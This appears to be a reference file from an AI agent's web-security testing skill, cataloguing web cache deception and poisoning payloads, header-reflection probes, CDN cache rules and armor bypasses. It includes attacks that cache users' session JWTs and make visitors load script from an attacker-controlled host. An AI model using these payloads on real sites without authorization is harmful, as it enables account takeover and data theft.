# Web cache deception & poisoning — deep catalogue — Open WHEN: the small body list did not fire and you need the full delimiter/normalization matrix, the unkeyed-input technique set, or the per-CDN cache rules

The SKILL.md body already covers the core deception suffixes, the unkeyed
header list, the buster discipline, and the hit/miss oracles. Do NOT re-test
those — this file is the long-tail matrix and the heavier techniques that are
not in the body.

## Web cache deception — path-shape matrix

The deception works when the cache and the origin disagree about where the
path ends. The origin routes on `/account/profile`; the cache thinks the
request is a static `*.css`. Cycle these shapes against any private,
authenticated page (always behind a `?cb=<nonce>` buster while probing):

### Plain static suffix
- `/account/profile/nonexistent.css`
- `/account/profile/x.js`
- `/account/profile/x.png` `/x.jpg` `/x.ico` `/x.svg` `/x.woff`
- `/home.php/nonexistent.css`
- `/api/auth/session/x.css`  (the OpenAI ChatGPT case — session JWT cached)
- `/myaccount/home/malicious.css`  (the PayPal case)

### Delimiter discrepancy
The origin treats a delimiter character as ending the meaningful path; the
cache keeps the whole string and sees a static extension. Probe each
delimiter between the real path and a static-looking filename:

- `/settings/profile;x.js`         (semicolon — matrix-param delimiter)
- `/settings/profile%3bx.js`       (encoded semicolon)
- `/profile%00x.css`               (null byte)
- `/profile%23x.css`               (encoded `#` — origin sees fragment)
- `/profile%3fx.css`               (encoded `?` — origin sees query start)
- `/profile%0ax.css` `/profile%0dx.css`  (encoded LF / CR)
- `/profile%09x.css`               (tab)
- `/profile%20x.css`               (space)
- `/profile!x.css` `/profile~x.css` `/profile,x.css` `/profile&x.css`
- For the exhaustive set, mirror PortSwigger's WCD lab delimiter list and
  test each character both raw and percent-encoded.

### Path-normalization discrepancy
The cache stores the literal, un-normalized path; the origin resolves the
traversal and serves a different (private) resource:

- `/static/..%2fprofile`      (cache caches under `/static/..%2fprofile`,
                               origin resolves to `/profile`)
- `/wcd/..%2fprofile`
- `/assets/..%2f..%2faccount`
- `/profile/%2e%2e/x.css`
- Double-encoded: `/static/..%252fprofile` when one layer decodes once.

### Why the suffix matters
A cache that keys "cache anything ending `.css|.js|.png|...`" stores the
private HTML body under that key. The origin ignored the bogus suffix
because it routed on an earlier segment. The cross-user retrieve is the
proof — fetch the same URL with no cookie and you get the stored private
page.

## Web cache poisoning — unkeyed-input techniques

### Header reflection (the classic)
Send a canary in each candidate header (behind a buster), grep the body,
then prove unkeyed by re-fetching without the header:

```
GET /test?cb=8e3f HTTP/1.1
Host: target.example
X-Forwarded-Host: canary.example

HTTP/1.1 200 OK
Cache-Control: public, no-cache
...
<meta property="og:image" content="https://canary.example">
```

If a clean `GET /test?cb=8e3f` (no `X-Forwarded-Host`) returns the
`canary.example` body, the header is unkeyed and you have poisoned that key.
High-value reflection sinks: `<script src>`, `<link href>`, redirect
`Location`, `og:image`/`og:url`, canonical link, import maps.

Candidate headers (start here, then fall back to the full wordlist in
`unkeyed-headers.txt`):
- `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`
- `X-Forwarded-Scheme`, `X-Forwarded-Proto`  (often combine with
  `X-Forwarded-Host` to flip `https`→`http` and trigger a cached redirect)
- `X-Original-URL`, `X-Rewrite-URL`  (Symfony / framework path overrides)
- `Host` itself, when the cache keys on the routed path but not the host

### Fat GET / request-body in a GET
Some origins read parameters from a GET request *body*; the cache keys only
on the line. A body parameter then becomes unkeyed. Send a GET with a body
that overrides a query value and check whether the cache stores the
overridden response.

### Parameter cloaking / cache-key normalization gaps
The cache and origin parse the query string differently:
- Duplicate params — `?utm=x&utm=<payload>`: cache keys the first, origin
  uses the last (or vice-versa).
- Delimiter confusion — `?param=x;poison=1` where the origin splits on `;`
  but the cache treats it as one value.
- Case/encoding of the param name the cache strips from the key but the
  origin still reads.

### Unkeyed query param
A parameter the cache excludes from its key but the origin reflects lets you
store a per-request variant under the shared key. Find which params are
keyed by toggling each and watching for MISS (keyed) vs HIT (unkeyed).

### Vary-driven poisoning
If the response sets `Vary: User-Agent` (or another header) but the cache
honours `Vary` loosely, the varied header becomes a partial key you can
collide on. Conversely, a *missing* `Vary` on a response that reflects a
header is the cleanest poison — every visitor shares one key.

### DOM / resource poisoning
When the reflected value lands in a resource URL the page loads
(`<script src="//canary.example/x.js">`), the cached page makes every later
visitor fetch from a host you control. Co-dispatch the `xss` worker for the
context-correct payload once you confirm the sink is cacheable.

## CDN cache rules

### Cloudflare
- Caches when `Cache-Control: public` and `max-age > 0`.
- Decides by **file extension, not MIME type**. HTML is not cached by
  default; a static extension on a dynamic path is the deception lever.
- *Cache Deception Armor* (OFF by default) verifies the URL extension
  matches the returned `Content-Type`. When OFF, the extension trick works.

Default-cached extensions behind Cloudflare:

```
7Z   AVI  AVIF APK  BIN  BMP  BZ2  CLASS CSS  CSV  DOC  DOCX DMG  EJS
EOT  EPS  EXE  FLAC GIF  GZ   ICO  ISO  JAR  JPG  JPEG JS   MID  MIDI
MKV  MP3  MP4  OGG  OTF  PDF  PICT PLS  PNG  PPT  PPTX PS   RAR  SVG
SVGZ SWF  TAR  TIF  TIFF TTF  WEBM WEBP WOFF WOFF2 XLS  XLSX ZIP  ZST
```

Armor exceptions / bypasses:
- `Content-Type: application/octet-stream` — extension is ignored (it is a
  download signal), so the armor extension check is sidestepped.
- Cloudflare allows benign MIME mismatches (`.jpg` served as `image/webp`,
  `.gif` as `video/webm`).
- Historically the `.avif` extension bypassed armor (HackerOne #1391635,
  since fixed) — test newly added extensions against the armor.

### Varnish / nginx proxy_cache / Fastly
- Read `X-Varnish`, `Via`, `X-Served-By`, `X-Timer` (Fastly), `X-Cache`,
  `X-Cache-Hits`.
- Cache rules come from VCL / config, not a fixed extension list — probe
  empirically which paths and which query params are keyed.
- Fastly surrogate keys and `Surrogate-Control` can override
  `Cache-Control`; a `Surrogate-Control: max-age` on a private page is a
  deception candidate.

### Akamai / CloudFront
- Akamai: `X-Cache`, `X-Cache-Key`, pragma debug headers when enabled.
- CloudFront: `X-Cache: Hit from cloudfront` / `Miss from cloudfront`,
  `X-Amz-Cf-Pop`, `X-Amz-Cf-Id`. CloudFront keys on a configurable subset
  of query/headers/cookies — the forwarded subset is where unkeyed inputs
  hide.

## High-value private targets to suffix for deception
- `/account`, `/account/profile`, `/myaccount/home`, `/settings`
- `/api/auth/session`, `/api/me`, `/api/user`, `/whoami`
- Pages that render the user's email, API keys, balance, or a JWT in the
  body. Cached JWT/session blobs are the highest-impact deception
  (account access from the stored credential).
